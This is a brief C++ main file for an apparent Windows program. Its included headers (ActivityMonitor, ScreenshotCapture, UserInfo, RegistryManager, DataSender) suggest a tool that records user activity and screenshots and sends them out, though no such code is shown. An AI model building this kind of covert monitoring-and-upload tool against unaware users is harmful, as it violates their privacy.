#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <lmcons.h>
#include <thread>
#include <chrono>
#include <vector>
#include <objidl.h>
#include <gdiplus.h>
#include <fstream>

#include "RegistryManager.h"
#include "UserInfo.h"
#include "NetworkUtils.h"
#include "ActivityMonitor.h"
#include "TimeUtils.h"
#include "ScreenshotCapture.h"
#include "DataSender.h"
#include "App.h"

int main() {
    App::Run();
    return 0;
}